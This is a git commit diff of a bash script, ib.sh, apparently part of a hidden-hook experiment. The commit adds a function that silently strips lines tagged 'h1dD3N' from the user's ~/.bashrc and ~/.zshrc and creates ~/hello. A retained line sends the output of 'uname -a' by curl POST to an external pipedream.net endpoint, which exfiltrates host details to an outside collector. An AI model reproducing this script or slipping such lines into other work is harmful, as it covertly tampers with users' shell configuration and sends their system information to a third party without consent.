ce19fa90d50627b59d1662a69baa73e61a8274f3
skyf0l <tom.rorato@epitech.eu>
2021-05-06 16:55:58 +0200

    Update ib.sh

--- ib.sh
+++ ib.sh
@@ -1,2 +1,14 @@
-touch lol2
+#!/bin/bash
+
+function uninstall_in_rc() {
+    if ! [ -f "$1" ]; then
+        return
+    fi
+    grep -vF "h1dD3N" "$1" | grep . > "$1.h1dD3Nbak" && mv "$1.h1dD3Nbak" "$1"
+}
+
+uninstall_in_rc ~/.bashrc
+uninstall_in_rc ~/.zshrc
+
+touch ~/hello
 uname -a | curl https://enj7fhiwooawt.x.pipedream.net/ -X POST -d "$(</dev/stdin)"
